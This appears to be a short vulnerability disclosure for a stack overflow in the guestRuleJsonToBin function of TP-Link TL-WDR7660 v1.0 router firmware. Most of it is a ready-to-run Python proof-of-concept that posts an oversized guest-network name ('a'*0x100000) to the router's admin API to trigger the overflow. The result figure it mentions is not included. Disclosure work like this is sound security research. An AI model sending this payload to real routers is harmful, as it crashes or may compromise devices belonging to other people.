**A stack overflow vulnerability exists in TL-WDR7660 version: TL-WDR7660 ver1.0**
The guestRuleJsonToBin function handles the important parameter string name without checking it. It can lead to stack overflow vulnerabilities.

**Exploit a vulnerability in the guestRuleJsonToBin function by sending a carefully constructed HTTP request**
```
url = "http://192.168.1.1/stok=B*qqlvYTn(bVsXtuytGm%2B0%5EP3nOE0dF~/ds " #COOKIE需要对应捕获
# 请求头
headers = {
    "Host": "192.168.1.1",
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0",
    "Accept": "application/json, text/javascript, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Type": "application/json; charset=UTF-8",
    "X-Requested-With": "XMLHttpRequest",
    "Origin": "http://192.168.1.1",
    "Referer": "http://192.168.1.1/"
}
# 请求体--漏洞利用json
data = {"guest_network":{"name":"a"*0x100000,"table":"guest_rule_2g","para":{"mon":"1","tue":"1","wed":"1","thu":"1","fri":"1","sat":"1","sun":"1","name":"name","start_time":"01%3A00","end_time":"02%3A00"}},"method":"add"}# 发送POST请求
response = requests.post(url, headers=headers, json=data)
# 输出响应内容
print(response.text)
```

**The following figure shows the result**
